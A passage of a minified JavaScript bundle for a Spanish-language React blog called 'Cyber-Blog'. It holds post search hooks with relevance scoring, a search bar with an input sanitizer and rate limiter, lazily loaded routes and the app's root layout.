usePostsSubscription(o){reactExports.useEffect(()=>{let i=null;return import.meta&&import.meta.hot&&(i=subscribeToPosts(o)),()=>{i&&i()}},[o])}function usePublishedPosts(){const[o,i]=reactExports.useState([]);reactExports.useEffect(()=>{getPublishedPosts().then(i).catch(console.error)},[]);const s=reactExports.useCallback(c=>{i(c.filter(d=>d.published))},[]);return usePostsSubscription(s),o}function useAllPosts(){const[o,i]=reactExports.useState([]);reactExports.useEffect(()=>{getAllPosts().then(i).catch(console.error)},[]);const s=reactExports.useCallback(c=>{i(c)},[]);return usePostsSubscription(s),o}function useSearch(o,i=2){const[s,c]=reactExports.useState([]),[d,f]=reactExports.useState(!0),h=reactExports.useDeferredValue(o);reactExports.useEffect(()=>{let b=!0;async function x(){try{f(!0);const P=await getPublishedPosts();b&&c(P)}catch(P){console.error("Error al cargar posts para búsqueda:",P)}finally{b&&f(!1)}}return x(),()=>{b=!1}},[]);const u=reactExports.useCallback(b=>{c(b.filter(x=>x.published))},[]);usePostsSubscription(u);const m=reactExports.useMemo(()=>{const b=h.trim().toLowerCase();if(!b||b.length<i)return[];const x=b,P=[];return s.forEach(E=>{let w=0;const T=[],j=E.title.toLowerCase();j.includes(x)&&(w+=10,T.push("título"),j.startsWith(x)&&(w+=5)),E.tags.forEach(I=>{const N=I.toLowerCase();N.includes(x)&&(w+=8,T.includes("etiquetas")||T.push("etiquetas"),N.startsWith(x)&&(w+=3))}),E.description.toLowerCase().includes(x)&&(w+=6,T.push("descripción")),E.date.includes(x)&&(w+=4,T.push("fecha")),E.content&&E.content.toLowerCase().includes(x)&&(w+=2,T.push("contenido")),w>0&&P.push({post:E,relevance:w,matchedFields:T})}),P.sort((E,w)=>w.relevance-E.relevance),P},[h,s,i]),v=h!==o&&o.length>=i||d&&o.length>=i;return{results:m,isLoading:v,hasResults:m.length>0,totalResults:m.length}}const SearchResults=reactExports.memo(function o({results:i,isLoading:s,isVisible:c,onClose:d,query:f}){return jsxRuntimeExports.jsx(AnimatePresence,{children:c&&jsxRuntimeExports.jsxs(motion.div,{initial:{opacity:0,y:-10,scale:.95},animate:{opacity:1,y:0,scale:1},exit:{opacity:0,y:-10,scale:.95},transition:{duration:.2},className:"bg-cyber-card/95 backdrop-blur-md border border-cyber-border rounded-lg shadow-2xl overflow-hidden max-h-[80vh] flex flex-col",children:[jsxRuntimeExports.jsxs("div",{className:"p-3 border-b border-cyber-border/50 bg-cyber-primary/5 flex items-center justify-between sticky top-0 backdrop-blur-sm z-10",children:[jsxRuntimeExports.jsxs("h3",{className:"text-xs font-mono font-bold text-cyber-primary uppercase tracking-wider flex items-center gap-2",children:[jsxRuntimeExports.jsx("span",{className:"w-2 h-2 rounded-full bg-cyber-primary animate-pulse"}),'Resultados: "',f,'"']}),jsxRuntimeExports.jsxs("span",{className:"text-[10px] text-cyber-muted font-mono",children:[i.length," ENCONTRADOS"]})]}),jsxRuntimeExports.jsx("div",{className:"overflow-y-auto custom-scrollbar p-2",children:s?jsxRuntimeExports.jsxs("div",{className:"flex flex-col items-center justify-center p-8 space-y-4",children:[jsxRuntimeExports.jsxs("div",{className:"relative w-12 h-12",children:[jsxRuntimeExports.jsx("div",{className:"absolute inset-0 border-t-2 border-cyber-primary rounded-full animate-spin"}),jsxRuntimeExports.jsx("div",{className:"absolute inset-2 border-r-2 border-cyber-secondary rounded-full animate-spin-reverse"})]}),jsxRuntimeExports.jsx("span",{className:"text-cyber-primary font-mono text-sm animate-pulse",children:"ESCANEANDO BASE DE DATOS..."})]}):i.length===0?jsxRuntimeExports.jsxs("div",{className:"text-center p-8 flex flex-col items-center",children:[jsxRuntimeExports.jsx("div",{className:"w-16 h-16 bg-cyber-card rounded-full flex items-center justify-center border border-cyber-border mb-4",children:jsxRuntimeExports.jsx(FileText,{className:"h-8 w-8 text-cyber-muted"})}),jsxRuntimeExports.jsx("p",{className:"text-cyber-text font-bold mb-1",children:"Sin coincidencias"}),jsxRuntimeExports.jsx("p",{className:"text-xs text-cyber-muted max-w-[200px]",children:"No se encontraron datos que coincidan con los parámetros de búsqueda."})]}):jsxRuntimeExports.jsx("div",{className:"space-y-2",children:i.map((h,u)=>jsxRuntimeExports.jsx(motion.div,{initial:{opacity:0,x:-10},animate:{opacity:1,x:0},transition:{delay:u*.05},children:jsxRuntimeExports.jsxs(Link,{to:`/post/${h.post.id}`,onClick:d,className:`card block p-4 rounded-lg bg-cyber-card/40 border border-cyber-border/30 hover-elevate gpu-smooth
                               hover:bg-cyber-primary/10 hover:border-cyber-primary/50 transition-all duration-300 group relative overflow-hidden`,children:[jsxRuntimeExports.jsx("div",{className:"absolute left-0 top-0 bottom-0 w-1 bg-cyber-primary transform -translate-x-full group-hover:translate-x-0 transition-transform duration-300"}),jsxRuntimeExports.jsxs("div",{className:"flex justify-between items-start gap-4",children:[jsxRuntimeExports.jsxs("div",{className:"flex-1 min-w-0",children:[jsxRuntimeExports.jsx("h4",{className:"font-cyber font-bold text-cyber-text group-hover:text-cyber-primary transition-colors mb-1 truncate",children:h.post.title}),jsxRuntimeExports.jsxs("div",{className:"flex items-center gap-3 text-[10px] text-cyber-muted font-mono mb-2",children:[jsxRuntimeExports.jsxs("div",{className:"flex items-center gap-1",children:[jsxRuntimeExports.jsx(Calendar,{className:"h-3 w-3"}),jsxRuntimeExports.jsx("span",{children:formatPostDate(h.post.date)})]}),h.post.readTime&&jsxRuntimeExports.jsxs("div",{className:"flex items-center gap-1",children:[jsxRuntimeExports.jsx(Clock,{className:"h-3 w-3"}),jsxRuntimeExports.jsx("span",{children:h.post.readTime})]})]}),h.matchedFields.length>0&&jsxRuntimeExports.jsx("div",{className:"flex items-center gap-2 mb-2",children:h.matchedFields.map(m=>jsxRuntimeExports.jsx("span",{className:"chip-3d chip-3d-sm font-mono",children:m},m))}),jsxRuntimeExports.jsx("p",{className:"text-xs text-cyber-text/70 line-clamp-2",children:h.post.description})]}),jsxRuntimeExports.jsx(ChevronRight,{className:"h-5 w-5 text-cyber-muted group-hover:text-cyber-primary transform group-hover:translate-x-1 transition-all"})]})]})},h.post.id))})}),jsxRuntimeExports.jsxs("div",{className:"p-2 border-t border-cyber-border/30 bg-black/20 text-[10px] text-center text-cyber-muted font-mono",children:["PRESS ",jsxRuntimeExports.jsx("span",{className:"text-cyber-primary",children:"ENTER"})," TO SELECT"]})]})})}),sanitizeSearchInput=o=>{let s=o.trim().slice(0,100);return s=s.replace(/[<>'";&()]/g,""),s},sanitizeTag=o=>o.trim().replace(/[^a-zA-Z0-9\s\-+#]/g,"").slice(0,50);class SimpleRateLimiter{constructor(){Re(this,"attempts",new Map)}checkLimit(i,s,c){const d=Date.now(),h=(this.attempts.get(i)||[]).filter(u=>d-u<c);return h.length>=s?!1:(h.push(d),this.attempts.set(i,h),!0)}reset(i){this.attempts.delete(i)}}const searchRateLimiter=new SimpleRateLimiter;function SearchBar({placeholder:o="BUSCAR EN EL SISTEMA...",onSearch:i}){const[s,c]=reactExports.useState(""),[d,f]=reactExports.useState(!1),h=reactExports.useRef(null),u=reactExports.useRef(null),{results:m,isLoading:v}=useSearch(s);reactExports.useEffect(()=>{const E=w=>{h.current&&!h.current.contains(w.target)&&f(!1)};return document.addEventListener("mousedown",E),()=>document.removeEventListener("mousedown",E)},[]),reactExports.useEffect(()=>{const E=w=>{w.key==="Escape"&&(f(!1),u.current?.blur()),(w.metaKey||w.ctrlKey)&&w.key==="k"&&(w.preventDefault(),u.current?.focus())};return document.addEventListener("keydown",E),()=>document.removeEventListener("keydown",E)},[]);const b=E=>{const w=E.target.value,T=sanitizeSearchInput(w);searchRateLimiter.checkLimit("search",60,1e4)&&(c(T),i?.(T))},x=E=>{E.preventDefault(),s.trim()&&m.length>0&&(window.location.href=`/post/${m[0].post.id}`,f(!1))},P=()=>{c(""),f(!1),u.current?.focus()};return jsxRuntimeExports.jsxs("div",{ref:h,className:"relative w-full max-w-xl",children:[jsxRuntimeExports.jsx("form",{onSubmit:x,children:jsxRuntimeExports.jsxs("div",{className:"relative group",children:[jsxRuntimeExports.jsx(motion.div,{animate:{boxShadow:d||s?["0 0 10px rgba(0, 255, 159, 0.2)","0 0 20px rgba(0, 255, 159, 0.4)","0 0 10px rgba(0, 255, 159, 0.2)"]:"0 0 0px rgba(0, 255, 159, 0)"},transition:{duration:1.5,repeat:d||s?1/0:0},className:"absolute inset-0 rounded-lg pointer-events-none"}),jsxRuntimeExports.jsx(Search,{className:"absolute left-4 top-1/2 transform -translate-y-1/2 text-cyber-primary/70 h-5 w-5 transition-all group-hover:text-cyber-primary group-hover:drop-shadow-[0_0_5px_rgba(0,255,159,0.5)]"}),jsxRuntimeExports.jsx("input",{ref:u,type:"search",value:s,onChange:b,onFocus:()=>f(!0),placeholder:o,className:`w-full bg-black/40 border border-cyber-border/50 rounded-lg pl-12 pr-12 py-3
                     text-base text-cyber-text placeholder:text-cyber-muted/70 placeholder:font-mono focus:outline-none focus:border-cyber-primary
                     focus:ring-1 focus:ring-cyber-primary/50 backdrop-blur-md transition-all duration-300
                     hover:bg-black/60 hover:border-cyber-primary/70 shadow-inner font-mono text-sm tracking-wide`}),(d||s)&&jsxRuntimeExports.jsx(motion.div,{className:"absolute inset-0 rounded-lg bg-gradient-to-r from-cyber-primary/0 via-cyber-primary/10 to-cyber-primary/0 pointer-events-none",animate:{x:["-100%","100%"]},transition:{duration:1.5,repeat:1/0,ease:"easeInOut"}}),jsxRuntimeExports.jsx("div",{className:"absolute right-3 top-1/2 transform -translate-y-1/2 flex items-center",children:s?jsxRuntimeExports.jsx(motion.button,{type:"button",onClick:P,className:"text-cyber-muted hover:text-cyber-primary transition-colors p-1",whileHover:{scale:1.1},whileTap:{scale:.95},children:jsxRuntimeExports.jsx(X,{className:"h-4 w-4"})}):jsxRuntimeExports.jsxs("div",{className:"hidden md:flex items-center gap-1 text-[10px] text-cyber-muted border border-cyber-border/30 rounded px-1.5 py-0.5 font-mono",children:[jsxRuntimeExports.jsx("span",{className:"text-xs",children:"⌘"}),jsxRuntimeExports.jsx("span",{children:"K"})]})}),jsxRuntimeExports.jsx("div",{className:"absolute inset-0 rounded-lg bg-cyber-primary/5 opacity-0 group-hover:opacity-100 peer-focus:opacity-100 transition-opacity pointer-events-none"})]})}),jsxRuntimeExports.jsx("div",{className:"absolute top-full left-0 right-0 mt-2 z-50",children:jsxRuntimeExports.jsx(SearchResults,{results:m,isLoading:v,isVisible:d&&s.length>0,onClose:()=>f(!1),query:s})})]})}const Index=reactExports.lazy(()=>__vitePreload(()=>import("./Index-T1GwpKjR.js"),__vite__mapDeps([0,1,2,3,4])).then(o=>({default:o.Index}))),About=reactExports.lazy(()=>__vitePreload(()=>import("./About-Ixyw03tC.js"),__vite__mapDeps([5,3,2,4])).then(o=>({default:o.About}))),Content=reactExports.lazy(()=>__vitePreload(()=>import("./Content-BUdM0G30.js"),__vite__mapDeps([6,1,2,3,4])).then(o=>({default:o.Content}))),Tags=reactExports.lazy(()=>__vitePreload(()=>import("./Tags-DwKquZM3.js"),__vite__mapDeps([7,2,1,3,4])).then(o=>({default:o.Tags}))),TagPosts=reactExports.lazy(()=>__vitePreload(()=>import("./TagPosts-CrxSy1eX.js"),__vite__mapDeps([8,2,1,3,4])).then(o=>({default:o.TagPosts}))),Post=reactExports.lazy(()=>__vitePreload(()=>import("./Post-w8XdIc3s.js"),__vite__mapDeps([9,2,10,3,4])).then(o=>({default:o.Post}))),NotFound=reactExports.lazy(()=>__vitePreload(()=>import("./NotFound-Cj6_lh_Y.js"),__vite__mapDeps([10,2,3,4])).then(o=>({default:o.NotFound})));function PageLoader(){return jsxRuntimeExports.jsx("div",{className:"flex items-center justify-center min-h-screen",children:jsxRuntimeExports.jsxs("div",{className:"text-center space-y-4",children:[jsxRuntimeExports.jsx("div",{className:"relative w-12 h-12 mx-auto",children:jsxRuntimeExports.jsx("div",{className:"absolute inset-0 border-t-2 border-cyber-primary rounded-full animate-spin"})}),jsxRuntimeExports.jsx("p",{className:"text-cyber-muted font-mono text-sm",children:"Cargando..."})]})})}function Routes(){return jsxRuntimeExports.jsx(AnimatePresence,{mode:"wait",children:jsxRuntimeExports.jsx(reactExports.Suspense,{fallback:jsxRuntimeExports.jsx(PageLoader,{}),children:jsxRuntimeExports.jsxs(Routes$1,{children:[jsxRuntimeExports.jsx(Route,{path:"/",element:jsxRuntimeExports.jsx(Index,{})}),jsxRuntimeExports.jsx(Route,{path:"/about",element:jsxRuntimeExports.jsx(About,{})}),jsxRuntimeExports.jsx(Route,{path:"/content",element:jsxRuntimeExports.jsx(Content,{})}),jsxRuntimeExports.jsx(Route,{path:"/tags",element:jsxRuntimeExports.jsx(Tags,{})}),jsxRuntimeExports.jsx(Route,{path:"/tags/:tagName",element:jsxRuntimeExports.jsx(TagPosts,{})}),jsxRuntimeExports.jsx(Route,{path:"/post/:id",element:jsxRuntimeExports.jsx(Post,{})}),jsxRuntimeExports.jsx(Route,{path:"*",element:jsxRuntimeExports.jsx(NotFound,{})})]})})})}function Aplicación(){const o=c=>{console.log("Buscando:",c)},[i,s]=React.useState(!1);return jsxRuntimeExports.jsx(BrowserRouter,{children:jsxRuntimeExports.jsxs(ThemeProvider,{defaultTheme:"dark",storageKey:"vite-ui-theme",children:[jsxRuntimeExports.jsxs("div",{className:"min-h-screen bg-cyber-background text-cyber-text relative overflow-x-hidden selection:bg-cyber-primary/30 selection:text-cyber-primary",children:[jsxRuntimeExports.jsx("div",{className:"scanline-overlay"}),jsxRuntimeExports.jsxs("div",{className:"fixed inset-0 pointer-events-none z-0",children:[jsxRuntimeExports.jsx("div",{className:"absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-cyber-primary/5 rounded-full blur-[120px]"}),jsxRuntimeExports.jsx("div",{className:"absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-cyber-secondary/5 rounded-full blur-[120px]"})]}),jsxRuntimeExports.jsx("header",{className:"fixed top-0 md:left-64 left-0 right-0 z-40 bg-cyber-background/80 backdrop-blur-md border-b border-cyber-border/40 transition-all duration-300 gpu-smooth",children:jsxRuntimeExports.jsxs("div",{className:"w-full px-4 py-3 flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between max-w-7xl mx-auto",children:[jsxRuntimeExports.jsxs("div",{className:"flex items-center gap-3",children:[jsxRuntimeExports.jsx("button",{className:"md:hidden inline-flex items-center justify-center w-10 h-10 rounded-lg border border-cyber-border bg-cyber-card/60 text-cyber-text hover:bg-cyber-primary/20 hover:text-cyber-primary hover:border-cyber-primary/50 transition-all duration-300",onClick:()=>s(!0),"aria-label":"Abrir menú",children:jsxRuntimeExports.jsx(Menu,{className:"h-5 w-5"})}),jsxRuntimeExports.jsx("h1",{className:"text-cyber-primary text-3xl sm:text-4xl font-extrabold font-cyber glow-text tracking-widest uppercase leading-none",children:"Cyber-Blog"})]}),jsxRuntimeExports.jsx("div",{className:"w-full sm:max-w-md",children:jsxRuntimeExports.jsx(SearchBar,{onSearch:o})})]})}),jsxRuntimeExports.jsxs("div",{className:"flex pt-[72px] sm:pt-20 relative z-10",children:[jsxRuntimeExports.jsx(Sidebar,{}),jsxRuntimeExports.jsx("main",{className:"flex-1 px-4 md:px-8 py-6 md:py-8 ml-0 md:ml-64 min-h-[calc(100vh-80px)] transition-all duration-300 gpu-smooth",children:jsxRuntimeExports.jsx("div",{className:"max-w-7xl mx-auto animate-fade-in",children:jsxRuntimeExports.jsx(Routes,{})})})]}),i&&jsxRuntimeExports.jsx(SidebarOverlay,{onClose:()=>s(!1)})]}),jsxRuntimeExports.jsx($e,{position:"top-right",theme:"dark",toastOptions:{style:{background:"rgba(5, 5, 5, 0.9)",border:"1px solid rgba(0, 255, 159, 0.3)",color:"#e0e0e0",backdropFilter:"blur(8px)"},className:"font-mono"}})]})})}ReactDOM.createRoot(document.getElementById("root")).render(jsxRuntimeExports.jsx(React.StrictMode,{children:jsxRuntimeExports.jsx(QueryClientProvider,{client:queryClient,children:jsxRuntimeExports.jsx(Aplicación,{})})}));export{useAllPosts as a,usePostsSubscription as b,getPostsByTag as c,getPostById as d,formatPostDate as f,getPublishedPosts as g,jsxRuntimeExports as j,parseDateLocal as p,sanitizeTag as s,usePublishedPosts as u};
